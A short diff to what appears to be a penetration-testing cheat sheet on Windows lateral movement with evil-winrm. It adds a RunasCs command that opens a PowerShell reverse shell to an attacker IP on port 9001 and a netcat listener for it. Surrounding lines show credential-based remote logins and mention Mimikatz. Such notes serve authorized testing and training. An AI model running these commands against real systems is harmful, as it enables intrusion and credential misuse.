@@ -67,11 +67,18 @@ evil-winrm -i $TARGET_IP -r $DOMAIN -u $USER   # (with valid ticket in KRB5CCNAM
 evil-winrm -i $TARGET_IP -u $USER -p $PASS -s /path/to/scripts/ -e /path/to/exe/
 ```
 
-```text
+```bash
 # Upload/download files (inside evil-winrm session)
 upload /local/path/file.exe C:\Temp\file.exe
 download C:\Temp\file.txt /local/path/
 # Inside session: Invoke-Mimikatz (if loaded)
+```
+
+```bash
+# Upload RunasCs.exe
+PS C:\programdata> .\RunasCs.exe $Runas_USER $PASS powershell.exe -r $ATTACKER_IP:9001
+
+rlwarp nc -lvnp 9001
 ```
 
 ### RDP Lateral Movement
